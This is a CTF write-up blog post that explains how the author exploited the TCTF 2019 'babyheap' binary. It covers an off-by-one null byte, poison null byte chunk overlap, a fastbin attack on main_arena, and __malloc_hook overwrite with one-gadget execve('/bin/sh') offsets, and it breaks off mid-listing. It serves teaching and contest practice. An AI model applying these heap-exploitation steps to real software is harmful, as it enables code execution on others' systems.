<!doctype html>



  



    
  

<html class="theme-next logos use-motion" lang="zh-hk">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.useso.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">


  <meta name="keywords" content="Hexo, NexT">








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0">






<meta name="description" content="在二进制的蛮荒世界里有最迷惑的漏洞和最险恶的防护IDA 和 gdb 是忠实的伙伴逻辑和决心是我们的武器热爱是引路人  Hi, This is my first time to give a write-up in English. I attended TCTF 2019 last weekend and lucky enough to solve this lovely babyheap ch">
<meta property="og:type" content="article">
<meta property="og:title" content="[TCTF 2019] Babyheap">
<meta property="og:url" content="http://matshao.com/2019/03/28/Babayheap-2019/index.html">
<meta property="og:site_name" content="Mid Station">
<meta property="og:description" content="在二进制的蛮荒世界里有最迷惑的漏洞和最险恶的防护IDA 和 gdb 是忠实的伙伴逻辑和决心是我们的武器热爱是引路人  Hi, This is my first time to give a write-up in English. I attended TCTF 2019 last weekend and lucky enough to solve this lovely babyheap ch">
<meta property="og:locale" content="zh-hk">
<meta property="og:image" content="https://i.loli.net/2019/03/28/5c9c103c3f6ce.png">
<meta property="og:image" content="https://i.loli.net/2019/03/28/5c9c103c460f4.png">
<meta property="og:image" content="https://i.loli.net/2019/03/28/5c9c103c48edd.png">
<meta property="og:image" content="https://i.loli.net/2019/03/28/5c9c1ca89e98f.jpg">
<meta property="og:image" content="https://i.loli.net/2019/03/28/5c9c2b34278e1.png">
<meta property="og:image" content="https://i.loli.net/2019/03/28/5c9c2e2704f7a.jpg">
<meta property="og:updated_time" content="2019-04-11T15:54:32.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="[TCTF 2019] Babyheap">
<meta name="twitter:description" content="在二进制的蛮荒世界里有最迷惑的漏洞和最险恶的防护IDA 和 gdb 是忠实的伙伴逻辑和决心是我们的武器热爱是引路人  Hi, This is my first time to give a write-up in English. I attended TCTF 2019 last weekend and lucky enough to solve this lovely babyheap ch">
<meta name="twitter:image" content="https://i.loli.net/2019/03/28/5c9c103c3f6ce.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Logos',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://matshao.com/2019/03/28/Babayheap-2019/">





  <title> [TCTF 2019] Babyheap | Mid Station </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">

  





<script>
  	var _mtac = {};
  	(function() {
  		var mta = document.createElement("script");
  		mta.src = "http://pingjs.qq.com/h5/stats.js?v2.0.4";
  		mta.setAttribute("name", "MTAH5");
  		mta.setAttribute("sid", "500688563");
  		var s = document.getElementsByTagName("script")[0];
  		s.parentNode.insertBefore(mta, s);
  	})();
</script>





  
  
    
  

  <div class="container one-collumn sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
    <div class="header-logos"> 
      <div class="site-meta ">
  
    <div class="site-meta-headline">
      <a href="/">
        <img class="custom-logo-image" src="/images/logo_light.png" alt="Mid Station">
      </a>
    </div>
  

  <div class="custom-logo-site-title">
    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Mid Station</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
    
      <p class="site-subtitle"></p>
    
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首頁
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            歸檔
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            關於
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 
            
      </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://matshao.com/2019/03/28/Babayheap-2019/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="Matthew Shao">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Mid Station">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="Mid Station" src="/images/logo_light.png">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                [TCTF 2019] Babyheap
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">發表於</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-28T12:30:00+08:00">
                2019-03-28
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分類於</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Hack/" itemprop="url" rel="index">
                    <span itemprop="name">Hack</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <blockquote>
<p>在二进制的蛮荒世界里<br>有最迷惑的漏洞和最险恶的防护<br>IDA 和 gdb 是忠实的伙伴<br>逻辑和决心是我们的武器<br>热爱是引路人</p>
</blockquote>
<p>Hi, This is my first time to give a write-up in English. I attended TCTF 2019 last weekend and lucky enough to solve this lovely babyheap challenge 30mins before the game finished. Really enjoy this challenge and want to share it with more pwn players.<br><a id="more"></a><br>The challenge package contains 3 files: a 64bit ELF called babyheap, and two libraries <code>ld-2.28.so</code> and <code>libc-2.28.so</code>, seems that it is deployed under Ubuntu 18.10. If you’re using 16.04 or other versions of ubuntu, you certainly could run this binary with <code>LD_PRELOAD</code>, but my suggestion is setting up an 18.10 environment for debugging, because with <code>libc6-dbg</code> installed, you can get libc symbol and view the heap state easily. Meanwhile, the function offset from libc would be exactly the same as the target machine. Docker is a good option.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p>
<p>No surprise, all mitigations are presented, and as per its definition, this is a common note system challenge with the following menu:<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">===== Baby Heap in 2019 =====</span></span><br><span class="line">1. Allocate</span><br><span class="line">2. Update</span><br><span class="line">3. Delete</span><br><span class="line">4. View</span><br><span class="line">5. Exit</span><br><span class="line">Command:</span><br></pre></td></tr></table></figure></p>
<h2 id="Vulnerability-off-by-one-null-byte"><a href="#Vulnerability-off-by-one-null-byte" class="headerlink" title="Vulnerability: off-by-one null byte"></a>Vulnerability: off-by-one null byte</h2><p>It looks very familiar to me and I remember there was a similar babyheap challenge last year. I dropped them both in ida and look at the difference, then I identify the bug very soon. babyheap 2018 on the left, babyheap 2019 on the right. The change appears in update function, when it read the new content for an allocated chunk, it calls a function to get input.<br><img src="https://i.loli.net/2019/03/28/5c9c103c3f6ce.png" alt="bug1"><span class="image-caption">bug1</span><br>I followed into the function and, clearly, there is an off-by-one null byte bug in our 2019 challenge.<br><img src="https://i.loli.net/2019/03/28/5c9c103c460f4.png" alt="bug2"><span class="image-caption">bug2</span><br>Beside that, another change occurs in the init function, which stealthily malloc a large chunk.<br><img src="https://i.loli.net/2019/03/28/5c9c103c48edd.png" alt="difference"><span class="image-caption">difference</span><br>Other parts of the program are identical. BTW, babyheap 2018 was given an arbitrary off-by-one bug, we can overwrite one extra byte to the size of next chunk. A great writeup (in Chinese) can be found here: <a href="https://bbs.pediy.com/thread-226037.htm" target="_blank" rel="noopener">0CTF 2018 Babyheap</a></p>
<h2 id="Constrains-and-thoughts"><a href="#Constrains-and-thoughts" class="headerlink" title="Constrains and thoughts"></a>Constrains and thoughts</h2><p>OK, let’s wrap up the bug and constraints of this challenge:</p>
<ul>
<li>Bug: off-by-one null byte</li>
<li>Constrains:<ol>
<li>list address randomization</li>
<li>0 &lt; size &lt; 88 (0x58)</li>
<li>at max 16 items in the array</li>
<li>libc 2.28 with tcache feature</li>
</ol>
</li>
</ul>
<p>In the init function, we can see the pointers of allocated items are not store at bss section as usual, but in a random memory space change each runtime. This prevents us to perform unlink attack technique or use the pointer list to perform arbitrary write. Also, it brings us some inconvenience when debugging, so I patch the file string <code>/dev/urandom</code> to <code>./addr\x00</code>, and create an <code>addr</code> file with 16 bytes in the same directory. With this trick, the address of item array fixed on each run.</p>
<p>There are two known techniques about off-by-one null byte, we can find them on <a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">how2heap</a>, the first one is <code>house-of-einherjar</code>, which results in getting a controlled pointer; the second is <code>poison null byte</code>, which leads to overlapping chunks. But both of techniques require the ability to malloc a small bin chunk, for example, we need to have a chunk size like <code>0x1xx</code>, so that we could overwrite it to <code>0x100</code> and perform following steps. So mission one for us: figure out how to create a small bin chunk.</p>
<h2 id="Small-bin-chunk"><a href="#Small-bin-chunk" class="headerlink" title="Small bin chunk"></a>Small bin chunk</h2><p>Remeber the suspicious <code>malloc(0x1f000)</code> in init function? After this operation, the top chunk becomes <code>0x1da0</code>.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heapinfoall</span><br><span class="line">===================  Thread <span class="number">1</span>  ===================</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555578260</span> (size : <span class="number">0x1da0</span>) </span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>) </span><br><span class="line">            unsortbin: <span class="number">0x0</span></span><br></pre></td></tr></table></figure></p>
<p>Then I investigated the source code of <a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#4164" target="_blank" rel="noopener">malloc.c</a>, it seems that when top chunk size is not enough for the malloc request, it will call <code>malloc_consolidate()</code> function and merge the freed chunk in fastbins! So, the idea is making a sequence of chunks on the fastbins, then consume the top chunk until small enough. Then any larger request will trigger <code>malloc_consolidate()</code> and make a small bin size chunk.</p>
<p>At first I worried about the tcache feature will prevent us from consuming the top chunk too far, however, it turns out tcache does not apply to <code>calloc</code>, once a chunk get into tcache bin, you cannot allocate it again with <code>calloc</code>. Also, we can shrink the top chunk size each time after allocation, this trick can help us to consume the top chunk quickly. Here is the heap state before triggering <code>malloc_consolidate()</code>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x555555578c80</span> --&gt; <span class="number">0x555555578c20</span> --&gt; <span class="number">0x555555578bc0</span> --&gt; <span class="number">0x555555578b60</span> --&gt; <span class="number">0x555555578b00</span> --&gt; <span class="number">0x555555578aa0</span> --&gt; <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555578e10</span> (size : <span class="number">0x30</span>) </span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>) </span><br><span class="line">            unsortbin: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)   tcache_entry[<span class="number">1</span>](<span class="number">7</span>): <span class="number">0x555555578a20</span> --&gt; <span class="number">0x5555555789f0</span> --&gt; <span class="number">0x5555555789c0</span> --&gt; <span class="number">0x555555578990</span> --&gt; <span class="number">0x555555578960</span> --&gt; <span class="number">0x555555578930</span> --&gt; <span class="number">0x555555578900</span></span><br><span class="line">(<span class="number">0x40</span>)   tcache_entry[<span class="number">2</span>](<span class="number">7</span>): <span class="number">0x5555555788c0</span> --&gt; <span class="number">0x555555578880</span> --&gt; <span class="number">0x555555578840</span> --&gt; <span class="number">0x555555578800</span> --&gt; <span class="number">0x5555555787c0</span> --&gt; <span class="number">0x555555578780</span> --&gt; <span class="number">0x555555578740</span></span><br><span class="line">(<span class="number">0x50</span>)   tcache_entry[<span class="number">3</span>](<span class="number">7</span>): <span class="number">0x5555555786f0</span> --&gt; <span class="number">0x5555555786a0</span> --&gt; <span class="number">0x555555578650</span> --&gt; <span class="number">0x555555578600</span> --&gt; <span class="number">0x5555555785b0</span> --&gt; <span class="number">0x555555578560</span> --&gt; <span class="number">0x555555578510</span></span><br><span class="line">(<span class="number">0x60</span>)   tcache_entry[<span class="number">4</span>](<span class="number">7</span>): <span class="number">0x5555555784b0</span> --&gt; <span class="number">0x555555578450</span> --&gt; <span class="number">0x5555555783f0</span> --&gt; <span class="number">0x555555578390</span> --&gt; <span class="number">0x555555578330</span> --&gt; <span class="number">0x5555555782d0</span> --&gt; <span class="number">0x555555578270</span></span><br></pre></td></tr></table></figure></p>
<p>Then we <code>calloc(0x28)</code>, it triggers <code>malloc_consolidate()</code> and merage fastbin chunk into unsotredbin, creating a chunk in size of <code>0x210</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555578e10</span> (size : <span class="number">0x30</span>) </span><br><span class="line">       last_remainder: <span class="number">0x555555578ad0</span> (size : <span class="number">0x210</span>) </span><br><span class="line">            unsortbin: <span class="number">0x555555578ad0</span> (size : <span class="number">0x210</span>)</span><br><span class="line">(<span class="number">0x30</span>)   tcache_entry[<span class="number">1</span>](<span class="number">7</span>): <span class="number">0x555555578a20</span> --&gt; <span class="number">0x5555555789f0</span> --&gt; <span class="number">0x5555555789c0</span> --&gt; <span class="number">0x555555578990</span> --&gt; <span class="number">0x555555578960</span> --&gt; <span class="number">0x555555578930</span> --&gt; <span class="number">0x555555578900</span></span><br><span class="line">(<span class="number">0x40</span>)   tcache_entry[<span class="number">2</span>](<span class="number">7</span>): <span class="number">0x5555555788c0</span> --&gt; <span class="number">0x555555578880</span> --&gt; <span class="number">0x555555578840</span> --&gt; <span class="number">0x555555578800</span> --&gt; <span class="number">0x5555555787c0</span> --&gt; <span class="number">0x555555578780</span> --&gt; <span class="number">0x555555578740</span></span><br><span class="line">(<span class="number">0x50</span>)   tcache_entry[<span class="number">3</span>](<span class="number">7</span>): <span class="number">0x5555555786f0</span> --&gt; <span class="number">0x5555555786a0</span> --&gt; <span class="number">0x555555578650</span> --&gt; <span class="number">0x555555578600</span> --&gt; <span class="number">0x5555555785b0</span> --&gt; <span class="number">0x555555578560</span> --&gt; <span class="number">0x555555578510</span></span><br><span class="line">(<span class="number">0x60</span>)   tcache_entry[<span class="number">4</span>](<span class="number">7</span>): <span class="number">0x5555555784b0</span> --&gt; <span class="number">0x555555578450</span> --&gt; <span class="number">0x5555555783f0</span> --&gt; <span class="number">0x555555578390</span> --&gt; <span class="number">0x555555578330</span> --&gt; <span class="number">0x5555555782d0</span> --&gt; <span class="number">0x555555578270</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Posion-Null-Byte"><a href="#Posion-Null-Byte" class="headerlink" title="Posion Null Byte"></a>Posion Null Byte</h2><p>Comparing two techniques about off-by-one null byte, <code>house of einherjar</code> seems not to suit for this case, so let’s play with <code>poison null byte</code>.  Here’s an amazing blog about it: <a href="http://tacxingxing.com/2018/01/24/poison-null-byte/" target="_blank" rel="noopener">Posion null byte | Ret2Forever</a> (also in Chinese), which makes me feel I have to borrow a picture from it.<br><img src="https://i.loli.net/2019/03/28/5c9c1ca89e98f.jpg" alt="posionnullbyte"><span class="image-caption">posionnullbyte</span><br>As the author concluded in this blog post, we need to allocate 3 chunks in this technique, name them a, b, c. Chunk a can be arbitrary size, but chunk b and c must <strong>not</strong> be fastbin size. Now we can make an unsorted bin to serve as chunk b, but what about chunk c? Does it have to be non-fastbin? No, the purpose of chunk c is to merge with chunk b and create a large chunk which overlap with some small chunks inside. So actually we can use the same trick in the last section to trigger <code>malloc_consolidate</code> and merge chunk b and c. Okey dokey, if we lay out the heap as it suggested, we can get the heap state like:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555578e10</span> (size : <span class="number">0x30</span>) </span><br><span class="line">       last_remainder: <span class="number">0x555555578b10</span> (size : <span class="number">0x230</span>) </span><br><span class="line">            unsortbin: <span class="number">0x555555578b10</span> (size : <span class="number">0x230</span>)</span><br><span class="line">(<span class="number">0x020</span>)  smallbin[ <span class="number">0</span>]: <span class="number">0x555555578cb0</span> (overlap chunk with <span class="number">0x555555578b10</span>(freed) )</span><br><span class="line">(<span class="number">0x30</span>)   tcache_entry[<span class="number">1</span>](<span class="number">7</span>): <span class="number">0x555555578a20</span> --&gt; <span class="number">0x5555555789f0</span> --&gt; <span class="number">0x5555555789c0</span> --&gt; <span class="number">0x555555578990</span> --&gt; <span class="number">0x555555578960</span> --&gt; <span class="number">0x555555578930</span> --&gt; <span class="number">0x555555578900</span></span><br><span class="line">(<span class="number">0x40</span>)   tcache_entry[<span class="number">2</span>](<span class="number">7</span>): <span class="number">0x5555555788c0</span> --&gt; <span class="number">0x555555578880</span> --&gt; <span class="number">0x555555578840</span> --&gt; <span class="number">0x555555578800</span> --&gt; <span class="number">0x5555555787c0</span> --&gt; <span class="number">0x555555578780</span> --&gt; <span class="number">0x555555578740</span></span><br><span class="line">(<span class="number">0x50</span>)   tcache_entry[<span class="number">3</span>](<span class="number">7</span>): <span class="number">0x5555555786f0</span> --&gt; <span class="number">0x5555555786a0</span> --&gt; <span class="number">0x555555578650</span> --&gt; <span class="number">0x555555578600</span> --&gt; <span class="number">0x5555555785b0</span> --&gt; <span class="number">0x555555578560</span> --&gt; <span class="number">0x555555578510</span></span><br><span class="line">(<span class="number">0x60</span>)   tcache_entry[<span class="number">4</span>](<span class="number">7</span>): <span class="number">0x5555555784b0</span> --&gt; <span class="number">0x555555578450</span> --&gt; <span class="number">0x5555555783f0</span> --&gt; <span class="number">0x555555578390</span> --&gt; <span class="number">0x555555578330</span> --&gt; <span class="number">0x5555555782d0</span> --&gt; <span class="number">0x555555578270</span></span><br></pre></td></tr></table></figure></p>
<p>and the item array is like:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xc0e5acba260</span>:  <span class="number">0x1</span>     <span class="number">0x58</span></span><br><span class="line"><span class="number">0xc0e5acba270</span>:  <span class="number">0x555555578a50</span>  <span class="number">0x1</span></span><br><span class="line"><span class="number">0xc0e5acba280</span>:  <span class="number">0x48</span>    <span class="number">0x555555578d50</span></span><br><span class="line"><span class="number">0xc0e5acba290</span>:  <span class="number">0x1</span>     <span class="number">0x48</span></span><br><span class="line"><span class="number">0xc0e5acba2a0</span>:  <span class="number">0x555555578da0</span>  <span class="number">0x1</span></span><br><span class="line"><span class="number">0xc0e5acba2b0</span>:  <span class="number">0x28</span>    <span class="number">0x555555578df0</span></span><br><span class="line"><span class="number">0xc0e5acba2c0</span>:  <span class="number">0x1</span>     <span class="number">0x28</span></span><br><span class="line"><span class="number">0xc0e5acba2d0</span>:  <span class="number">0x555555578ab0</span>  <span class="number">0x1</span></span><br><span class="line"><span class="number">0xc0e5acba2e0</span>:  <span class="number">0x30</span>    <span class="number">0x555555578ae0</span></span><br><span class="line"><span class="number">0xc0e5acba2f0</span>:  <span class="number">0x1</span>     <span class="number">0x58</span></span><br><span class="line"><span class="number">0xc0e5acba300</span>:  &#123;&#123;<span class="number">0x555555578b40</span>&#125;&#125;  <span class="number">0x0</span></span><br><span class="line"><span class="number">0xc0e5acba310</span>:  <span class="number">0x0</span>     <span class="number">0x0</span></span><br><span class="line"><span class="number">0xc0e5acba320</span>:  <span class="number">0x1</span>     <span class="number">0x58</span></span><br><span class="line"><span class="number">0xc0e5acba330</span>:  <span class="number">0x555555578ba0</span>  <span class="number">0x1</span></span><br><span class="line"><span class="number">0xc0e5acba340</span>:  <span class="number">0x58</span>    <span class="number">0x555555578c00</span></span><br><span class="line"><span class="number">0xc0e5acba350</span>:  <span class="number">0x1</span>     <span class="number">0x58</span></span><br><span class="line"><span class="number">0xc0e5acba360</span>:  <span class="number">0x555555578c60</span>  <span class="number">0x0</span></span><br></pre></td></tr></table></figure></p>
<p>Now the large chunk in unsortedbin(<code>0x555555578b10</code>) is already overlap with item #6(<code>0x555555578b40</code>). Following job is straight-forward, just like baby heap 2018. We perform fastbin attack to get an item from the address in <code>main_arena</code>, then we change <code>top chunk</code> to somewhere before <code>__malloc_hook</code>, then we could overwrite <code>__malloc_hook</code> with one gadget. Btw, you have to turn on ASLR to complete fastbin attack on main_arena, and it only success when heap address starts with <code>0x56</code>, otherwise the size check fails.</p>
<p>But unfortunately, all one gadget in libc-2.28 does not meet the requirement at the call:<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x50186</span> execve(<span class="string">"/bin/sh"</span>, <span class="built_in">rsp</span>+<span class="number">0x40</span>, environ)</span><br><span class="line"><span class="symbol">constraints:</span></span><br><span class="line">  <span class="built_in">rcx</span> == NULL</span><br><span class="line"></span><br><span class="line"><span class="number">0x501e3</span> execve(<span class="string">"/bin/sh"</span>, <span class="built_in">rsp</span>+<span class="number">0x40</span>, environ)</span><br><span class="line"><span class="symbol">constraints:</span></span><br><span class="line">  [<span class="built_in">rsp</span>+<span class="number">0x40</span>] == NULL</span><br><span class="line"></span><br><span class="line"><span class="number">0x103f50</span> execve(<span class="string">"/bin/sh"</span>, <span class="built_in">rsp</span>+<span class="number">0x70</span>, environ)</span><br><span class="line"><span 